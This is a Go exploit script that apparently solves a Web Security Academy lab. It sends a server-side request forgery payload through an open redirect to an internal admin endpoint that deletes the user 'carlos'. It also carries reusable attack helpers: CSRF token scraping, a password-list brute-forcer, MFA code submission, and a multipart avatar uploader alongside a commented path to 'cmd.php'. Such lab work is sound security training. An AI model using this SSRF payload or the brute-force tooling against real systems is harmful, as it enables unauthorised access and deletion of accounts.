// 

package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/http/httputil"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
	"mime/multipart"
)

const trace bool = true
const userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	baseUrl := "https://0a5100fa03cc9c9dc067d64a00e60087.web-security-academy.net"
	//cartUrl := baseUrl + "/cart"
	//checkoutUrl := baseUrl + "/cart/checkout"
	//confirmUrl := baseUrl + "/cart/order-confirmation?order-confirmed=true"
	//myAccountUrl := baseUrl + "/my-account"
	//loginUrl := baseUrl + "/login"
	//adminUrl := baseUrl + "/admin"
	//adminDeleteUrl := baseUrl + "/admin/delete?username=carlos"
	//avatarUrl := baseUrl + "/files/avatars/cmd.php"
	//changePassUrl := baseUrl + "/my-account/change-password"
	//changeAvatarUrl := baseUrl + "/my-account/avatar"
	stockUrl := baseUrl + "/product/stock/"
	//myUser := "wiener"
	//myPass := "peter"
	//vicUser := "carlos"
	//vicPass := ""

	client, err := newClient()
	if err != nil {
		return err
	}

	//_, body, err := get(client, loginUrl, nil)
	//if err != nil {
	//	return err
	//}

	//csrfToken := parseCSRFToken(body)

	//_, body, err = login(client, loginUrl, myUser, myPass, csrfToken)
	//if err != nil {
	//	return err
	//}

	//csrfToken = parseCSRFToken(body)

	values := make(url.Values)
	//values.Set("csrf", csrfToken)
	values.Set("stockApi", "/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos")

	_, body, err := postForm(client, stockUrl, nil, values)
	if err != nil {
		return err
	}

	fmt.Println(body)
	return nil
}

func postAvatar(
	client *http.Client,
	u, username, csrfToken, file string,
	fn func(b []byte) ([]byte, error),
) error {
	f, err := os.Open(file)
	if err != nil {
		return err
	}
	defer f.Close()

	values := make(map[string]io.Reader)
	values["avatar"] = f
	values["user"] = strings.NewReader(username)
	values["csrf"] = strings.NewReader(csrfToken)

	contentType, buf, err := multipartData(values)
	if err != nil {
		return err
	}

	headers := make(http.Header)
	headers.Set("content-type", contentType)

	b := buf.Bytes()
	if fn != nil {
		b, err = fn(b)
		if err != nil {
			return err
		}
	}

	_, _, err = postMulti(client, u, headers, b)
	return err
}


func resetPass(client *http.Client, u, username, csrfToken, host string) (int, string, error) {
	data := url.Values{
		"username": {username},
		"csrf": {csrfToken},
	}

	return postForm(client, u, nil, data)
}

func login(client *http.Client, u, username, password, csrfToken string) (int, string, error) {
	data := url.Values{
		"username": {username},
		"password": {password},
		"csrf": {csrfToken},
	}

	return postForm(client, u, nil, data)
}

func changePass(client *http.Client, u, username, currPass, newPass1, newPass2 string) (int, string, error) {
	data := url.Values{
		"username": {username},
		"current-password": {currPass},
		"new-password-1": {newPass1},
		"new-password-2": {newPass2},
	}

	return postForm(client, u, nil, data)
}

func tryPass(fn func(pass string) (bool, error)) (error) {
	f, err := os.Open("passwords.txt")
	if err != nil {
		return err
	}
	defer f.Close()

	sc := bufio.NewScanner(f)
	for sc.Scan() {
		pass := sc.Text()
		cont, err := fn(pass)
		if err != nil {
			return err
		}
		if !cont {
			break
		}
	}
	return nil
}

func postCode(client *http.Client, u, code, csrfToken string) (int, string, error) {
	data := url.Values{
		"mfa-code": {code},
		"csrf": {csrfToken},
	}

	return postForm(client, u, nil, data)
}

func multipartData(values map[string]io.Reader) (contentType string, b *bytes.Buffer, err error) {
    b = &bytes.Buffer{}
    w := multipart.NewWriter(b)
    for key, r := range values {
        var fw io.Writer
        if x, ok := r.(io.Closer); ok {
            defer x.Close()
        }
        if x, ok := r.(*os.File); ok {
            if fw, err = w.CreateFormFile(key, x.Name()); err != nil {
                return
            }
        } else {
            if fw, err = w.CreateFormField(key); err != nil {
                return
            }
        }
        if _, err = io.Copy(fw, r); err != nil {
            return
        }

    }
    // If you don't close it, your request will be missing the terminating boundary.
    w.Close()

    // Don't forget to set the content type, this will contain the boundary.
    contentType = w.FormDataContentType()
    return
}

func postMulti(client *http.Client, u string, headers http.Header, data []byte) (int, string, error) {
	return post(client, u, headers, data)
}

func postForm(client *http.Client, u string, headers http.Header, data url.Values) (int, string, error) {
	if headers == nil {
		headers = make(http.Header)
	} else {
		headers = headers.Clone()
	}
	headers.Set("content-type", "application/x-www-form-urlencoded")
	return post(client, u, headers, []byte(data.Encode()))
}

func post(client *http.Client, u string, headers http.Header, data []byte) (int, string, error) {
	req, err := http.NewRequest("POST", u, bytes.NewReader(data))
	if err != nil {
		return 0, "", err
	}
	req.Header.Set("user-agent", userAgent)
	setHeaders(req, headers)

	resp, err := client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", err
	}

	if resp.StatusCode/100 == 4 || resp.StatusCode/100 == 5 {
		return resp.StatusCode, string(body), fmt.Errorf("%v", resp.Status)
	}

	return resp.StatusCode, string(body), nil
}

func setHeaders(req *http.Request, headers http.Header) {
	for k, vals := range headers {
		req.Header.Del(k)
		for _, val := range vals {
			req.Header.Add(k, val)
		}
	}
}

func get(client *http.Client, u string, headers http.Header) (int, string, error) {
	req, err := http.NewRequest("GET", u, nil)
	if err != nil {
		return 0, "", err
	}
	req.Header.Set("user-agent", userAgent)
	setHeaders(req, headers)

	resp, err := client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", err
	}

	if resp.StatusCode/100 == 4 || resp.StatusCode/100 == 5 {
		return resp.StatusCode, string(body), fmt.Errorf("%v", resp.Status)
	}

	return resp.StatusCode, string(body), nil
}

var csrfRE *regexp.Regexp = regexp.MustCompile(`name="csrf" value="([^"]+)"`)

func parseCSRFToken(body string) string {
	matches := csrfRE.FindStringSubmatch(body)
	if len(matches) < 2 {
		return ""
	}
	return string(matches[1])
}

func setCookie(client *http.Client, us, name, value string) error {
	u, err := url.Parse(us)
	if err != nil {
		return err
	}
	c := &http.Cookie{Name: name, Value: value}
	client.Jar.SetCookies(u, []*http.Cookie{c})
	return nil
}

func newClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	return &http.Client{
		Jar: jar,
		Timeout: 10 * time.Second,
		Transport: &traceTransport{},
	}, nil
}

type traceTransport struct {}

func (t *traceTransport) RoundTrip(r *http.Request) (*http.Response, error) {
	//if r.Method == "GET" && r.URL.Path == "/role-selector" {
	//	return mockResponse()
	//}

	dumpReqOut(r)
	resp, err := http.DefaultTransport.RoundTrip(r)
	dumpResp(resp)
	return resp, err
}

func mockResponse() (*http.Response, error) {
	ior := strings.NewReader(`HTTP/1.1 200 OK
Connection: close
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html></html>`)
	b := bufio.NewReader(ior)

	return http.ReadResponse(b, nil)
}

func dumpReqOut(req *http.Request) {
	if !trace {
		return
	}

	dump, err := httputil.DumpRequestOut(req, true)
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Printf("-----\n%q\n", dump)
}

func dumpResp(resp *http.Response) {
	if !trace {
		return
	}

	dump, err := httputil.DumpResponse(resp, true)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("-----\n%q\n", dump)
}
